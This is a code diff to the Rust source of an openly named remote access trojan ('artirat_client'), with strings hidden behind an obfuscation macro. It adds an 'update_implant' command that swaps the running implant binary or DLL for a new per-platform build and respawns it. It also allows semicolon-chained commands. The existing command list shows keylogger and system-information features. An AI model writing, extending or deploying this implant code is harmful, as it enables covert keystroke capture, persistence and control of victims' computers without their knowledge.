@@ -130,6 +130,109 @@ fn get_username() -> String {
         .unwrap_or_else(|_| astr!("unknown"))
 }
 
+fn get_target_triple() -> &'static str {
+    #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
+    {
+        astr!("x86_64-unknown-linux-gnu")
+    }
+    #[cfg(all(target_os = "linux", target_arch = "x86"))]
+    {
+        astr!("i686-unknown-linux-gnu")
+    }
+    #[cfg(all(target_os = "windows", target_arch = "x86_64"))]
+    {
+        astr!("x86_64-pc-windows-gnu")
+    }
+    #[cfg(all(target_os = "windows", target_arch = "x86"))]
+    {
+        astr!("i686-pc-windows-gnu")
+    }
+    #[cfg(target_os = "android")]
+    {
+        astr!("aarch64-linux-android")
+    }
+    #[cfg(all(target_os = "macos", target_arch = "x86_64"))]
+    {
+        astr!("x86_64-apple-darwin")
+    }
+    #[cfg(all(target_os = "macos", target_arch = "aarch64"))]
+    {
+        astr!("aarch64-apple-darwin")
+    }
+}
+
+fn get_implant_filename(is_dll: bool) -> &'static str {
+    if is_dll {
+        #[cfg(target_os = "windows")]
+        {
+            astr!("libartirat_client.dll")
+        }
+        #[cfg(target_os = "linux")]
+        {
+            astr!("libartirat_client.so")
+        }
+        #[cfg(target_os = "android")]
+        {
+            astr!("libartirat_client.so")
+        }
+        #[cfg(target_os = "macos")]
+        {
+            astr!("libartirat_client.dylib")
+        }
+    } else {
+        #[cfg(target_os = "windows")]
+        {
+            astr!("artirat_client.exe")
+        }
+        #[cfg(not(target_os = "windows"))]
+        {
+            astr!("artirat_client")
+        }
+    }
+}
+
+fn find_dist_dir(start: &Path) -> Option<std::path::PathBuf> {
+    let mut current = Some(start.to_path_buf());
+    while let Some(dir) = current {
+        let candidate = dir.join(astr!("dist").as_str());
+        if candidate.is_dir() {
+            return Some(candidate);
+        }
+        current = dir.parent().map(|p| p.to_path_buf());
+    }
+    None
+}
+
+#[cfg(target_os = "windows")]
+fn get_current_dll_path() -> Option<std::path::PathBuf> {
+    use std::ptr;
+    use winapi::shared::minwindef::HMODULE;
+    use winapi::um::libloaderapi::{GetModuleHandleExW, GetModuleFileNameW};
+    unsafe {
+        let mut hmodule: HMODULE = ptr::null_mut();
+        if GetModuleHandleExW(
+            winapi::um::libloaderapi::GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS,
+            get_current_dll_path as *const () as *const u16,
+            &mut hmodule,
+        ) == 0
+        {
+            return None;
+        }
+        let mut path = [0u16; winapi::shared::minwindef::MAX_PATH as usize];
+        let len = GetModuleFileNameW(
+            hmodule,
+            path.as_mut_ptr(),
+            winapi::shared::minwindef::MAX_PATH as u32,
+        );
+        if len == 0 {
+            return None;
+        }
+        Some(std::path::PathBuf::from(String::from_utf16_lossy(
+            &path[..len as usize],
+        )))
+    }
+}
+
 /// Execute a command
 pub async fn run_command(input: &str) -> Result<Vec<u8>> {
     let mut parts = input.trim().split_whitespace();
@@ -158,6 +261,7 @@ Available commands:
     `sysinfo`=>\tGather system information and private IP
     `keylogger_start`=>\tStart capturing keystrokes
     `keylogger_stop`=>\tStop the keylogger
+    `update_implant`=>\tUpdate implant from dist directory
 
     "
             )
@@ -415,6 +519,104 @@ Available commands:
             }
         }
 
+        _ if cmd == astr!("update_implant") => {
+            let target_triple = get_target_triple();
+            let is_dll = util::is_dll();
+
+            let current_path = if is_dll {
+                #[cfg(target_os = "windows")]
+                {
+                    get_current_dll_path().ok_or_else(|| {
+                        anyhow!(astr!("update_implant: failed to get dll path"))
+                    })?
+                }
+                #[cfg(not(target_os = "windows"))]
+                {
+                    unreachable!()
+                }
+            } else {
+                std::env::current_exe().map_err(|e| {
+                    anyhow!(
+                        "{}: {}",
+                        astr!("update_implant: failed to get exe path"),
+                        e
+                    )
+                })?
+            };
+
+            let bin_dir = current_path.parent().ok_or_else(|| {
+                anyhow!(astr!("update_implant: failed to get binary directory"))
+            })?;
+
+            let dist_path = find_dist_dir(bin_dir)
+                .or_else(|| {
+                    std::env::current_dir()
+                        .ok()
+                        .and_then(|cwd| find_dist_dir(&cwd))
+                })
+                .ok_or_else(|| anyhow!(astr!("update_implant: dist directory not found")))?;
+
+            let implant_dir = dist_path.join(get_target_triple().as_str());
+            let implant_name = get_implant_filename(is_dll);
+            let new_implant = implant_dir.join(implant_name.as_str());
+
+            if !new_implant.exists() {
+                return Ok(format!(
+                    "{} {}\n",
+                    astr!("update_implant: binary not found at "),
+                    new_implant.display()
+                )
+                .into_bytes());
+            }
+
+            if is_dll {
+                let _ = fs::copy(&new_implant, &current_path);
+                return Ok(format!(
+                    "{}\n",
+                    astr!(
+                        "update_implant: dll updated, restart host to load new version"
+                    )
+                )
+                .into_bytes());
+            }
+
+            let tmp_name = astr!(".artirat_update");
+            #[cfg(target_os = "windows")]
+            let tmp_name = astr!(".artirat_update.exe");
+            let temp_path = bin_dir.join(tmp_name.as_str());
+
+            fs::copy(&new_implant, &temp_path)?;
+
+            #[cfg(target_os = "windows")]
+            {
+                let backup = bin_dir.join(astr!(".artirat_old.exe").as_str());
+                let _ = fs::rename(&current_path, &backup);
+                fs::rename(&temp_path, &current_path).map_err(|e| {
+                    let _ = fs::rename(&backup, &current_path);
+                    anyhow!(
+                        "{}: {}",
+                        astr!("update_implant: failed to replace binary"),
+                        e
+                    )
+                })?;
+                let _ = fs::remove_file(&backup);
+            }
+
+            #[cfg(not(target_os = "windows"))]
+            {
+                fs::rename(&temp_path, &current_path).map_err(|e| {
+                    anyhow!(
+                        "{}: {}",
+                        astr!("update_implant: failed to replace binary"),
+                        e
+                    )
+                })?;
+            }
+
+            let _ = std::process::Command::new(&current_path).spawn();
+            std::process::exit(0);
+        }
+
         _ if cmd == astr!("exit") || cmd == astr!("quit") || cmd == astr!("/quit") => {
             Ok(astr!("Goodbye\n").into_bytes())
         }
@@ -583,15 +785,17 @@ pub async fn read_loop(
                         continue;
                     }
 
-                    match run_command(&line).await {
-                      Ok(output) => {
-                      writer.write_all(&output).await?;
-                      }
-                      Err(e) => {
-                        let err_msg = format!("{}{}\n", astr!("ERROR: "), e);
-                        writer.write_all(err_msg.as_bytes()).await?;
+                    for cmd in line.split(';').map(|s| s.trim()).filter(|s| !s.is_empty()) {
+                        match run_command(cmd).await {
+                            Ok(output) => {
+                                writer.write_all(&output).await?;
+                            }
+                            Err(e) => {
+                                let err_msg = format!("{}{}\n", astr!("ERROR: "), e);
+                                writer.write_all(err_msg.as_bytes()).await?;
+                            }
+                        }
                     }
-                }
                 }
 
                 let needs_flush = {
